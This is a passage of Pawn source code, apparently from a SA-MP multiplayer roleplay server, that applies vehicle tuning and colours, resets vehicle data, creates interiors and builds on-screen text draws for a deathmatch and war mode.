_:public changepaintjobcolor(vehicleid, v_vColor1, v_vColor2)
{
	SMG_ChangeVehicleColor(vehicleid, v_vColor1, v_vColor2);
	return 1;
}

_:public TuneVehicle( vehicleid )
{
	if( vehicleid != -1 )
	{
		if( VehicleInfo[ vehicleid ][ vTuned ] != 0 )
		{
		 	if( IsASpoiler( VehicleInfo[ vehicleid ][ vSpoiler ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vSpoiler ] );
			if( IsANitro( VehicleInfo[ vehicleid ][ vNitro ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vNitro ] );
			if( IsAFrontBumper( VehicleInfo[ vehicleid ][ vFrontBumper ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vFrontBumper ] );
			if( IsARearBumper( VehicleInfo[ vehicleid ][ vRearBumper ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vRearBumper ] );
			if( IsAStereo( VehicleInfo[ vehicleid ][ vStereo ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vStereo ] );
			if( IsAExhaust( VehicleInfo[ vehicleid ][ vExhaust ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vExhaust ] );
			if( IsALamp( VehicleInfo[ vehicleid ][ vLamps ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vLamps ] );
		    if( IsAHydraulic( VehicleInfo[ vehicleid ][ vHydraulics ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vHydraulics ] );
		    if( IsAVents( VehicleInfo[ vehicleid ][ vVents ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vVents ] );
		    if( IsAHood( VehicleInfo[ vehicleid ][ vHood ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vHood ] );
			if( IsAWheel( VehicleInfo[ vehicleid ][ vWheels ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vWheels ] );
			if( IsARoof( VehicleInfo[ vehicleid ][ vRoof ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vRoof ] );
			if( IsASkirt( VehicleInfo[ vehicleid ][ vSkirt ] ) ) AddVehicleComponent( vehicleid, VehicleInfo[ vehicleid ][ vSkirt ] );

            SMG_ChangeVehicleColor( vehicleid, VehicleInfo[ vehicleid ][ vColor1 ], VehicleInfo[ vehicleid ][ vColor2 ] );

            if( VehicleInfo[ vehicleid ][ vPaintJob ] >= 0 && VehicleInfo[ vehicleid ][ vPaintJob ] < 6 ) ChangeVehiclePaintjob( vehicleid, VehicleInfo[ vehicleid ][ vPaintJob ] );

	        changepaintjobcolor(vehicleid, VehicleInfo[vehicleid][vColor1], VehicleInfo[vehicleid][vColor2]);
	  	}
	}
}

_:public TuneParkVehicle( vehicleid, v_vTuned, v_vPaintJob, v_vSpoiler, v_vNitro, v_vFrontBumper, v_vRearBumper, v_vStereo, v_vExhaust, v_vLamps, v_vHydraulics, v_vVents, v_vHood, v_vWheels, v_vRoof, v_vSkirt, v_vColor1, v_vColor2 ) {

	if( vehicleid != -1 ) {

		if( v_vTuned != 0 ) {

		 	if( IsASpoiler( v_vSpoiler ) ) AddVehicleComponent( vehicleid, v_vSpoiler );
			if( IsANitro( v_vNitro ) ) AddVehicleComponent( vehicleid, v_vNitro );
			if( IsAFrontBumper( v_vFrontBumper ) ) AddVehicleComponent( vehicleid, v_vFrontBumper );
			if( IsARearBumper( v_vRearBumper ) ) AddVehicleComponent( vehicleid, v_vRearBumper );
			if( IsAStereo( v_vStereo ) ) AddVehicleComponent( vehicleid, v_vStereo );
			if( IsAExhaust( v_vExhaust ) ) AddVehicleComponent( vehicleid, v_vExhaust );
			if( IsALamp( v_vLamps ) ) AddVehicleComponent( vehicleid, v_vLamps );
		    if( IsAHydraulic( v_vHydraulics ) ) AddVehicleComponent( vehicleid, v_vHydraulics );
		    if( IsAVents( v_vVents ) ) AddVehicleComponent( vehicleid, v_vVents );
		    if( IsAHood( v_vHood ) ) AddVehicleComponent( vehicleid, v_vHood );
			if( IsAWheel( v_vWheels ) ) AddVehicleComponent( vehicleid, v_vWheels );
			if( IsARoof( v_vRoof ) ) AddVehicleComponent( vehicleid, v_vRoof );
			if( IsASkirt( v_vSkirt ) ) AddVehicleComponent( vehicleid, v_vSkirt );

		    SMG_ChangeVehicleColor( vehicleid, v_vColor1, v_vColor2 );

		    if( v_vPaintJob >= 0 && v_vPaintJob < 6 ) ChangeVehiclePaintjob( vehicleid, v_vPaintJob );

		    changepaintjobcolor(vehicleid, v_vColor1, v_vColor2);
	  	}
	}
}
//------------------------------------------------------------------------------
_:public IsPlayerNearPlayer(Float:radi, playerid, targetid)
{
    if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
	{
	    if( GetPlayerVirtualWorld( playerid ) == GetPlayerVirtualWorld( targetid ) )
		{
			new Float:posx, Float:posy, Float:posz,
			    Float:oldposx, Float:oldposy, Float:oldposz,
			    Float:tempposx, Float:tempposy, Float:tempposz;

			GetPlayerPos( playerid, oldposx, oldposy, oldposz);

			GetPlayerPos(targetid, posx, posy, posz);
			tempposx = (oldposx -posx);
			tempposy = (oldposy -posy);
			tempposz = (oldposz -posz);

			if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
			{
				return 1;
			}
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
_:public ResetVehicleStatistics( i )
{
    if( i != IVI )
	{
		KutijaMatsa[ i ] = false;
	}
}

_:public SetVehicleLabels( i )
{
	if( !VehicleInfo[ i ][ Validv3DText ] )
	{
	    /*if( VehicleInfo[ i ][ vUsage ] == PRIVATNO_VOZILO )
		{
	        if( VehicleInfo[ i ][ vOwner_sqlID ] != 0 )
			{
	            new string[ 50+MAX_PLAYER_NAME+1 ];
	            format( string, sizeof( string ), "(PRIVATNO)\n{FFFFFF}%s", VehicleInfo[ i ][ vOwner ] );
				VehicleInfo[ i ][ Validv3DText ] = true;
    			VehicleInfo[ i ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x4282C0FF, 0.0, 0.0, -100.0, 15.0, IPI, i, 0, -1, -1, -1, 15.0, -1, 0);
	        }
	    }
		else*/
		if( VehicleInfo[ i ][ vUsage ] == ORGANIZACIJSKO_VOZILO )
		{
			new stringce[ 50 ];
			format( stringce, sizeof( stringce ), "(ORG)\n{FFFFFF}%s", org_info[ VehicleInfo[ i ][ vOrganizationSQLID ] ][ oName ] );
			VehicleInfo[ i ][ v3DText ] = CreateDynamic3DTextLabel(stringce, 0x4DDBFFFF, 0.0, 0.0, -100.0, 7.5, IPI, i, 0, -1, -1, -1, 7.5, -1, 0);
		    VehicleInfo[ i ][ Validv3DText ] = true;
		}
	}
}

_:public ResetVehicle( i ) 
{
    VehicleInfo[ i ][ vSqlID ] = 0;
	VehicleInfo[ i ][ vOwner_sqlID ] = 0;
    VehicleInfo[ i ][ vPrice ] = 0;
	strmid( VehicleInfo[ i ][ vOwner ], "Drzava", 0, strlen("Drzava"), 32);
    VehicleInfo[ i ][ vLocked ] = 0;
    VehicleInfo[ i ][ vLokacijaX ] = 0;
    VehicleInfo[ i ][ vLokacijaY ] = 0;
    VehicleInfo[ i ][ vLokacijaZ ] = 0;
    VehicleInfo[ i ][ vLokacijaA ] = 0;
    VehicleInfo[ i ][ vVirtualWorld ] = 0;
	VehicleInfo[ i ][ vInterior ] = 0;
    VehicleInfo[ i ][ vUsage ] = 0;
    VehicleInfo[ i ][ vOrganizationSQLID ] = 0;
    VehicleInfo[ i ][ vOrganization ] = -1;
    VehicleInfo[ i ][ vColor1 ] = 0;
    VehicleInfo[ i ][ vColor2 ] = 0;
    VehicleInfo[ i ][ vModel ] = 0;
    VehicleInfo[ i ][ vReg ] = 0;
    VehicleInfo[ i ][ vRegVreme ] = 0;
    VehicleInfo[ i ][ vTeh ] = 0;
    VehicleInfo[ i ][ vOsiguranje ] = 0;
    VehicleInfo[ i ][ vLock ] = 0;
    VehicleInfo[ i ][ vAlarm ] = 0;
    VehicleInfo[ i ][ vNeon ] = 0;
    VehicleInfo[ i ][ vTuned ] = 0;
    VehicleInfo[ i ][ vImobilizator ] = 0;
    VehicleInfo[ i ][ vSpoiler ] = 0;
    VehicleInfo[ i ][ vHood ] = 0;
    VehicleInfo[ i ][ vRoof ] = 0;
    VehicleInfo[ i ][ vSkirt ] = 0;
    VehicleInfo[ i ][ vLamps ] = 0;
    VehicleInfo[ i ][ vNitro ] = 0;
    VehicleInfo[ i ][ vExhaust ] = 0;
    VehicleInfo[ i ][ vWheels ] = 0;
    VehicleInfo[ i ][ vStereo ] = 0;
    VehicleInfo[ i ][ vHydraulics ] = 0;
    VehicleInfo[ i ][ vFrontBumper ] = 0;
    VehicleInfo[ i ][ vRearBumper ] = 0;
    VehicleInfo[ i ][ vVents ] = 0;
    VehicleInfo[ i ][ vPaintJob ] = 255;
	VehicleInfo[ i ][ vDrugAmmount ] = 0;
	VehicleInfo[ i ][ vMaterijali ] = 0;
	VehicleInfo[ i ][ vMelee ] = 0;
	VehicleInfo[ i ][ vWeap1 ] = 0;
	VehicleInfo[ i ][ vAmmo1 ] = 0;
	VehicleInfo[ i ][ vWeap2 ] = 0;
	VehicleInfo[ i ][ vAmmo2 ] = 0;
	VehicleInfo[ i ][ vKilometri ] = 0;
	VehicleInfo[ i ][ vMetri ] = 0;
	VehicleInfo[ i ][ v_owner_id ] = -1;

	VehicleInfo[i][Validv3DText] = false;
    DestroyDynamic3DTextLabel(VehicleInfo[i][v3DText]);

    SetVehicleLabels(i);
}
//------------------------------------------------------------------------------
new interior_counter;
CreateInterior(const name[], Float:x, Float:y, Float:z, Float:ix, Float:iy, Float:iz, Float:ia, eIntID, IntIDx, vwID, vwIDx)
{
	interior_counter++;
	strmid( interior_info[ interior_counter ][ int_Name ], name, 0, strlen( name ), 255);
	interior_info[ interior_counter ][ int_Enter ][ 0 ] = x;
	interior_info[ interior_counter ][ int_Enter ][ 1 ] = y;
	interior_info[ interior_counter ][ int_Enter ][ 2 ] = z;
	interior_info[ interior_counter ][ int_Exit ][ 0 ] = ix;
	interior_info[ interior_counter ][ int_Exit ][ 1 ] = iy;
	interior_info[ interior_counter ][ int_Exit ][ 2 ] = iz;
	interior_info[ interior_counter ][ int_Exit ][ 3 ] = ia;

	interior_info[ interior_counter ][ int_IntExit ] = eIntID;
	interior_info[ interior_counter ][ int_VwExit ] = vwID;

	interior_info[ interior_counter ][ int_IntEnter ] = IntIDx;
	interior_info[ interior_counter ][ int_VwEnter ] = vwIDx;

	new string[100];
	format(string, sizeof(string), "{4282C0}(( %s ))\n{FFFFFF}\"ENTER\" {4282C0}za ulaz.", name);
	Create3DandP(string, x, y, z, -1, -1, 19133, 10.0);

	format(string, sizeof(string), "{4282C0}(( %s ))\n{FFFFFF}\"ENTER\" {4282C0}za izlaz.", name);
	Create3DandP(string, ix, iy, iz, -1, vwID, 1239, 10.0);

	return interior_counter;
}
//------------------------------------------------------------------------------
_:public GetVehicleZone(h, zone[], len)
{
	new
		Float:x22, Float:y22,
		Float:x,
	    Float:y,
		Float:z;

	GetVehiclePos(h, x, y, z);

	x22 = x, y22 = y;
	for( new i = 0; i != sizeof(gSAZones); i++ )
	{
		if(x22 >= gSAZones[ i ][SAZONE_AREA][ 0 ] && x22 <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y22 >= gSAZones[ i ][SAZONE_AREA][ 1 ] && y22 <= gSAZones[ i ][SAZONE_AREA][4])
		{
		    return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
_:public CreateTextDraws() 
{
	Ingame_gTD[0] = TextDrawCreate(628.397094, 441.677734, "uzivajte u igri");
	TextDrawLetterSize(Ingame_gTD[0], 0.102554, 0.485287);
	TextDrawAlignment(Ingame_gTD[0], 3);
	TextDrawColor(Ingame_gTD[0], -1);
	TextDrawSetShadow(Ingame_gTD[0], 0);
	TextDrawSetOutline(Ingame_gTD[0], 0);
	TextDrawBackgroundColor(Ingame_gTD[0], 255);
	TextDrawFont(Ingame_gTD[0], 2);
	TextDrawSetProportional(Ingame_gTD[0], 1);
	TextDrawSetShadow(Ingame_gTD[0], 0);

	Ingame_gTD[1] = TextDrawCreate(629.055847, 440.228820, "");
	TextDrawLetterSize(Ingame_gTD[1], 0.000000, 0.000000);
	TextDrawTextSize(Ingame_gTD[1], 6.859992, 7.000000);
	TextDrawAlignment(Ingame_gTD[1], 1);
	TextDrawColor(Ingame_gTD[1], -1);
	TextDrawSetShadow(Ingame_gTD[1], 0);
	TextDrawSetOutline(Ingame_gTD[1], 0);
	TextDrawBackgroundColor(Ingame_gTD[1], 0);
	TextDrawFont(Ingame_gTD[1], 5);
	TextDrawSetProportional(Ingame_gTD[1], 0);
	TextDrawSetShadow(Ingame_gTD[1], 0);
	TextDrawSetPreviewModel(Ingame_gTD[1], 1240);
	TextDrawSetPreviewRot(Ingame_gTD[1], 0.000000, 0.000000, 0.000000, 1.000000);

	Ingame_gTD[2] = TextDrawCreate(611.010559, 432.922302, "00:00");
	TextDrawLetterSize(Ingame_gTD[2], 0.252332, 0.972441);
	TextDrawAlignment(Ingame_gTD[2], 1);
	TextDrawColor(Ingame_gTD[2], -1);
	TextDrawSetShadow(Ingame_gTD[2], 0);
	TextDrawSetOutline(Ingame_gTD[2], 0);
	TextDrawBackgroundColor(Ingame_gTD[2], 255);
	TextDrawFont(Ingame_gTD[2], 3);
	TextDrawSetProportional(Ingame_gTD[2], 1);
	TextDrawSetShadow(Ingame_gTD[2], 0);

	Ingame_gTD[3] = TextDrawCreate(635.064208, 430.326629, "00/00/0000");
	TextDrawLetterSize(Ingame_gTD[3], 0.093555, 0.455287);
	TextDrawAlignment(Ingame_gTD[3], 3);
	TextDrawColor(Ingame_gTD[3], -1);
	TextDrawSetShadow(Ingame_gTD[3], 0);
	TextDrawSetOutline(Ingame_gTD[3], 0);
	TextDrawBackgroundColor(Ingame_gTD[3], 255);
	TextDrawFont(Ingame_gTD[3], 2);
	TextDrawSetProportional(Ingame_gTD[3], 1);
	TextDrawSetShadow(Ingame_gTD[3], 0);

	//------------------------------------------------------------------------//

	TDM_gTD[0] = TextDrawCreate(155.333358, 358.959167, "box");
	TextDrawLetterSize(TDM_gTD[0], 0.000000, 5.566664);
	TextDrawTextSize(TDM_gTD[0], 268.000000, 0.000000);
	TextDrawAlignment(TDM_gTD[0], 1);
	TextDrawColor(TDM_gTD[0], -1);
	TextDrawUseBox(TDM_gTD[0], 1);
	TextDrawBoxColor(TDM_gTD[0], 100);
	TextDrawSetShadow(TDM_gTD[0], 0);
	TextDrawSetOutline(TDM_gTD[0], 0);
	TextDrawBackgroundColor(TDM_gTD[0], 255);
	TextDrawFont(TDM_gTD[0], 1);
	TextDrawSetProportional(TDM_gTD[0], 1);
	TextDrawSetShadow(TDM_gTD[0], 0);

	TDM_gTD[1] = TextDrawCreate(159.833328, 358.629699, "box");
	TextDrawLetterSize(TDM_gTD[1], 0.000000, -0.333330);
	TextDrawTextSize(TDM_gTD[1], 263.121093, 0.000000);
	TextDrawAlignment(TDM_gTD[1], 1);
	TextDrawColor(TDM_gTD[1], -1);
	TextDrawUseBox(TDM_gTD[1], 1);
	TextDrawBoxColor(TDM_gTD[1], 445966079);
	TextDrawSetShadow(TDM_gTD[1], 0);
	TextDrawSetOutline(TDM_gTD[1], 0);
	TextDrawBackgroundColor(TDM_gTD[1], 255);
	TextDrawFont(TDM_gTD[1], 1);
	TextDrawSetProportional(TDM_gTD[1], 1);
	TextDrawSetShadow(TDM_gTD[1], 0);

	TDM_gTD[2] = TextDrawCreate(159.833328, 412.632995, "box");
	TextDrawLetterSize(TDM_gTD[2], 0.000000, -0.333330);
	TextDrawTextSize(TDM_gTD[2], 263.121093, 0.000000);
	TextDrawAlignment(TDM_gTD[2], 1);
	TextDrawColor(TDM_gTD[2], -1);
	TextDrawUseBox(TDM_gTD[2], 1);
	TextDrawBoxColor(TDM_gTD[2], 445966079);
	TextDrawSetShadow(TDM_gTD[2], 0);
	TextDrawSetOutline(TDM_gTD[2], 0);
	TextDrawBackgroundColor(TDM_gTD[2], 255);
	TextDrawFont(TDM_gTD[2], 1);
	TextDrawSetProportional(TDM_gTD[2], 1);
	TextDrawSetShadow(TDM_gTD[2], 0);

	TDM_gTD[3] = TextDrawCreate(159.833328, 358.329681, "box");
	TextDrawLetterSize(TDM_gTD[3], 0.000000, -0.333330);
	TextDrawTextSize(TDM_gTD[3], 189.000000, 0.000000);
	TextDrawAlignment(TDM_gTD[3], 1);
	TextDrawColor(TDM_gTD[3], -1);
	TextDrawUseBox(TDM_gTD[3], 1);
	TextDrawBoxColor(TDM_gTD[3], 445966079);
	TextDrawSetShadow(TDM_gTD[3], 0);
	TextDrawSetOutline(TDM_gTD[3], 0);
	TextDrawBackgroundColor(TDM_gTD[3], 255);
	TextDrawFont(TDM_gTD[3], 1);
	TextDrawSetProportional(TDM_gTD[3], 1);
	TextDrawSetShadow(TDM_gTD[3], 0);

	TDM_gTD[4] = TextDrawCreate(233.837844, 358.329681, "box");
	TextDrawLetterSize(TDM_gTD[4], 0.000000, -0.333330);
	TextDrawTextSize(TDM_gTD[4], 263.004516, 0.000000);
	TextDrawAlignment(TDM_gTD[4], 1);
	TextDrawColor(TDM_gTD[4], -1);
	TextDrawUseBox(TDM_gTD[4], 1);
	TextDrawBoxColor(TDM_gTD[4], 445966079);
	TextDrawSetShadow(TDM_gTD[4], 0);
	TextDrawSetOutline(TDM_gTD[4], 0);
	TextDrawBackgroundColor(TDM_gTD[4], 255);
	TextDrawFont(TDM_gTD[4], 1);
	TextDrawSetProportional(TDM_gTD[4], 1);
	TextDrawSetShadow(TDM_gTD[4], 0);

	TDM_gTD[5] = TextDrawCreate(234.037857, 413.033020, "box");
	TextDrawLetterSize(TDM_gTD[5], 0.000000, -0.333330);
	TextDrawTextSize(TDM_gTD[5], 263.204528, 0.000000);
	TextDrawAlignment(TDM_gTD[5], 1);
	TextDrawColor(TDM_gTD[5], -1);
	TextDrawUseBox(TDM_gTD[5], 1);
	TextDrawBoxColor(TDM_gTD[5], 445966079);
	TextDrawSetShadow(TDM_gTD[5], 0);
	TextDrawSetOutline(TDM_gTD[5], 0);
	TextDrawBackgroundColor(TDM_gTD[5], 255);
	TextDrawFont(TDM_gTD[5], 1);
	TextDrawSetProportional(TDM_gTD[5], 1);
	TextDrawSetShadow(TDM_gTD[5], 0);

	TDM_gTD[6] = TextDrawCreate(159.833328, 413.033020, "box");
	TextDrawLetterSize(TDM_gTD[6], 0.000000, -0.333330);
	TextDrawTextSize(TDM_gTD[6], 189.000000, 0.000000);
	TextDrawAlignment(TDM_gTD[6], 1);
	TextDrawColor(TDM_gTD[6], -1);
	TextDrawUseBox(TDM_gTD[6], 1);
	TextDrawBoxColor(TDM_gTD[6], 445966079);
	TextDrawSetShadow(TDM_gTD[6], 0);
	TextDrawSetOutline(TDM_gTD[6], 0);
	TextDrawBackgroundColor(TDM_gTD[6], 255);
	TextDrawFont(TDM_gTD[6], 1);
	TextDrawSetProportional(TDM_gTD[6], 1);
	TextDrawSetShadow(TDM_gTD[6], 0);

	TDM_gTD[7] = TextDrawCreate(159.833328, 357.929656, "box");
	TextDrawLetterSize(TDM_gTD[7], 0.000000, -0.299997);
	TextDrawTextSize(TDM_gTD[7], 176.000000, 0.000000);
	TextDrawAlignment(TDM_gTD[7], 1);
	TextDrawColor(TDM_gTD[7], -1);
	TextDrawUseBox(TDM_gTD[7], 1);
	TextDrawBoxColor(TDM_gTD[7], 445966079);
	TextDrawSetShadow(TDM_gTD[7], 0);
	TextDrawSetOutline(TDM_gTD[7], 0);
	TextDrawBackgroundColor(TDM_gTD[7], 255);
	TextDrawFont(TDM_gTD[7], 1);
	TextDrawSetProportional(TDM_gTD[7], 1);
	TextDrawSetShadow(TDM_gTD[7], 0);

	TDM_gTD[8] = TextDrawCreate(246.838638, 357.929656, "box");
	TextDrawLetterSize(TDM_gTD[8], 0.000000, -0.299997);
	TextDrawTextSize(TDM_gTD[8], 263.005310, 0.000000);
	TextDrawAlignment(TDM_gTD[8], 1);
	TextDrawColor(TDM_gTD[8], -1);
	TextDrawUseBox(TDM_gTD[8], 1);
	TextDrawBoxColor(TDM_gTD[8], 445966079);
	TextDrawSetShadow(TDM_gTD[8], 0);
	TextDrawSetOutline(TDM_gTD[8], 0);
	TextDrawBackgroundColor(TDM_gTD[8], 255);
	TextDrawFont(TDM_gTD[8], 1);
	TextDrawSetProportional(TDM_gTD[8], 1);
	TextDrawSetShadow(TDM_gTD[8], 0);

	TDM_gTD[9] = TextDrawCreate(246.838638, 413.333038, "box");
	TextDrawLetterSize(TDM_gTD[9], 0.000000, -0.299997);
	TextDrawTextSize(TDM_gTD[9], 263.005310, 0.000000);
	TextDrawAlignment(TDM_gTD[9], 1);
	TextDrawColor(TDM_gTD[9], -1);
	TextDrawUseBox(TDM_gTD[9], 1);
	TextDrawBoxColor(TDM_gTD[9], 445966079);
	TextDrawSetShadow(TDM_gTD[9], 0);
	TextDrawSetOutline(TDM_gTD[9], 0);
	TextDrawBackgroundColor(TDM_gTD[9], 255);
	TextDrawFont(TDM_gTD[9], 1);
	TextDrawSetProportional(TDM_gTD[9], 1);
	TextDrawSetShadow(TDM_gTD[9], 0);

	TDM_gTD[10] = TextDrawCreate(159.833328, 413.333038, "box");
	TextDrawLetterSize(TDM_gTD[10], 0.000000, -0.299997);
	TextDrawTextSize(TDM_gTD[10], 176.000000, 0.000000);
	TextDrawAlignment(TDM_gTD[10], 1);
	TextDrawColor(TDM_gTD[10], -1);
	TextDrawUseBox(TDM_gTD[10], 1);
	TextDrawBoxColor(TDM_gTD[10], 445966079);
	TextDrawSetShadow(TDM_gTD[10], 0);
	TextDrawSetOutline(TDM_gTD[10], 0);
	TextDrawBackgroundColor(TDM_gTD[10], 255);
	TextDrawFont(TDM_gTD[10], 1);
	TextDrawSetProportional(TDM_gTD[10], 1);
	TextDrawSetShadow(TDM_gTD[10], 0);

	TDM_gTD[11] = TextDrawCreate(151.066833, 353.537078, "+");
	TextDrawLetterSize(TDM_gTD[11], 0.147330, 0.621037);
	TextDrawAlignment(TDM_gTD[11], 1);
	TextDrawColor(TDM_gTD[11], 445966079);
	TextDrawSetShadow(TDM_gTD[11], 0);
	TextDrawSetOutline(TDM_gTD[11], 0);
	TextDrawBackgroundColor(TDM_gTD[11], 255);
	TextDrawFont(TDM_gTD[11], 2);
	TextDrawSetProportional(TDM_gTD[11], 1);
	TextDrawSetShadow(TDM_gTD[11], 0);

	TDM_gTD[12] = TextDrawCreate(267.866729, 408.892761, "+");
	TextDrawLetterSize(TDM_gTD[12], 0.156663, 0.641776);
	TextDrawAlignment(TDM_gTD[12], 1);
	TextDrawColor(TDM_gTD[12], 445966079);
	TextDrawSetShadow(TDM_gTD[12], 0);
	TextDrawSetOutline(TDM_gTD[12], 0);
	TextDrawBackgroundColor(TDM_gTD[12], 255);
	TextDrawFont(TDM_gTD[12], 2);
	TextDrawSetProportional(TDM_gTD[12], 1);
	TextDrawSetShadow(TDM_gTD[12], 0);

	TDM_gTD[13] = TextDrawCreate(189.966613, 367.426086, "");
	TextDrawLetterSize(TDM_gTD[13], 0.000000, 0.000000);
	TextDrawTextSize(TDM_gTD[13], 40.000000, 33.000000);
	TextDrawAlignment(TDM_gTD[13], 1);
	TextDrawColor(TDM_gTD[13], -239);
	TextDrawSetShadow(TDM_gTD[13], 0);
	TextDrawSetOutline(TDM_gTD[13], 0);
	TextDrawBackgroundColor(TDM_gTD[13], 0);
	TextDrawFont(TDM_gTD[13], 5);
	TextDrawSetProportional(TDM_gTD[13], 0);
	TextDrawSetShadow(TDM_gTD[13], 0);
	TextDrawSetPreviewModel(TDM_gTD[13], 1313);
	TextDrawSetPreviewRot(TDM_gTD[13], 0.000000, 0.000000, 0.000000, 1.000000);

	TDM_gTD[14] = TextDrawCreate(212.400115, 358.000061, "de_inferno");
	TextDrawLetterSize(TDM_gTD[14], 0.128665, 0.720592);
	TextDrawAlignment(TDM_gTD[14], 2);
	TextDrawColor(TDM_gTD[14], -1);
	TextDrawSetShadow(TDM_gTD[14], 0);
	TextDrawSetOutline(TDM_gTD[14], 0);
	TextDrawBackgroundColor(TDM_gTD[14], 255);
	TextDrawFont(TDM_gTD[14], 2);
	TextDrawSetProportional(TDM_gTD[14], 1);
	TextDrawSetShadow(TDM_gTD[14], 0);

	TDM_gTD[15] = TextDrawCreate(177.500076, 372.933349, "~b~CT");
	TextDrawLetterSize(TDM_gTD[15], 0.128665, 0.720592);
	TextDrawAlignment(TDM_gTD[15], 2);
	TextDrawColor(TDM_gTD[15], -1);
	TextDrawSetShadow(TDM_gTD[15], 0);
	TextDrawSetOutline(TDM_gTD[15], 0);
	TextDrawBackgroundColor(TDM_gTD[15], 255);
	TextDrawFont(TDM_gTD[15], 2);
	TextDrawSetProportional(TDM_gTD[15], 1);
	TextDrawSetShadow(TDM_gTD[15], 0);

	TDM_gTD[16] = TextDrawCreate(245.933380, 372.933319, "~r~TT");
	TextDrawLetterSize(TDM_gTD[16], 0.128665, 0.720592);
	TextDrawAlignment(TDM_gTD[16], 2);
	TextDrawColor(TDM_gTD[16], -1);
	TextDrawSetShadow(TDM_gTD[16], 0);
	TextDrawSetOutline(TDM_gTD[16], 0);
	TextDrawBackgroundColor(TDM_gTD[16], 255);
	TextDrawFont(TDM_gTD[16], 2);
	TextDrawSetProportional(TDM_gTD[16], 1);
	TextDrawSetShadow(TDM_gTD[16], 0);

	TDM_gTD[17] = TextDrawCreate(177.166748, 383.303649, "~b~score:_000");
	TextDrawLetterSize(TDM_gTD[17], 0.128665, 0.720592);
	TextDrawAlignment(TDM_gTD[17], 2);
	TextDrawColor(TDM_gTD[17], -1);
	TextDrawSetShadow(TDM_gTD[17], 0);
	TextDrawSetOutline(TDM_gTD[17], 0);
	TextDrawBackgroundColor(TDM_gTD[17], 255);
	TextDrawFont(TDM_gTD[17], 2);
	TextDrawSetProportional(TDM_gTD[17], 1);
	TextDrawSetShadow(TDM_gTD[17], 0);

	TDM_gTD[18] = TextDrawCreate(177.266754, 389.404022, "~b~players:_00");
	TextDrawLetterSize(TDM_gTD[18], 0.128665, 0.720592);
	TextDrawAlignment(TDM_gTD[18], 2);
	TextDrawColor(TDM_gTD[18], -1);
	TextDrawSetShadow(TDM_gTD[18], 0);
	TextDrawSetOutline(TDM_gTD[18], 0);
	TextDrawBackgroundColor(TDM_gTD[18], 255);
	TextDrawFont(TDM_gTD[18], 2);
	TextDrawSetProportional(TDM_gTD[18], 1);
	TextDrawSetShadow(TDM_gTD[18], 0);

	TDM_gTD[19] = TextDrawCreate(245.633468, 382.859283, "~r~score:_000");
	TextDrawLetterSize(TDM_gTD[19], 0.128665, 0.720592);
	TextDrawAlignment(TDM_gTD[19], 2);
	TextDrawColor(TDM_gTD[19], -1);
	TextDrawSetShadow(TDM_gTD[19], 0);
	TextDrawSetOutline(TDM_gTD[19], 0);
	TextDrawBackgroundColor(TDM_gTD[19], 255);
	TextDrawFont(TDM_gTD[19], 2);
	TextDrawSetProportional(TDM_gTD[19], 1);
	TextDrawSetShadow(TDM_gTD[19], 0);

	TDM_gTD[20] = TextDrawCreate(245.666839, 389.089233, "~r~players:_00");
	TextDrawLetterSize(TDM_gTD[20], 0.128665, 0.720592);
	TextDrawAlignment(TDM_gTD[20], 2);
	TextDrawColor(TDM_gTD[20], -1);
	TextDrawSetShadow(TDM_gTD[20], 0);
	TextDrawSetOutline(TDM_gTD[20], 0);
	TextDrawBackgroundColor(TDM_gTD[20], 255);
	TextDrawFont(TDM_gTD[20], 2);
	TextDrawSetProportional(TDM_gTD[20], 1);
	TextDrawSetShadow(TDM_gTD[20], 0);
}

//------------------------------------------------------------------------------

_:public WarTDControl( playerid, bool:show )
{
	if( show == true )
	{
		WAR_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 155.333358, 358.959167, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][0], 0.000000, 5.566664);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][0], 268.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][0], 100);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, WAR_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, WAR_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, WAR_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, WAR_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][0], 0);

		WAR_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 159.833328, 358.629699, "box");
		PlayerTextDrawLetterSize(playerid, WAR_pTD[playerid][1], 0.000000, -0.333330);
		PlayerTextDrawTextSize(playerid, WAR_pTD[playerid][1], 263.121093, 0.000000);
		PlayerTextDrawAlignment(playerid, WAR_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, WAR_pTD[playerid][1], -1);
		PlayerTextDrawUseBox(playerid, WAR_pTD[playerid][1], 1);
		PlayerTextDrawBoxColor(playerid, WAR_pTD[playerid][1], 445966079);
		PlayerTextDrawSetShadow(playerid, WAR_pTD[playerid][1], 0);
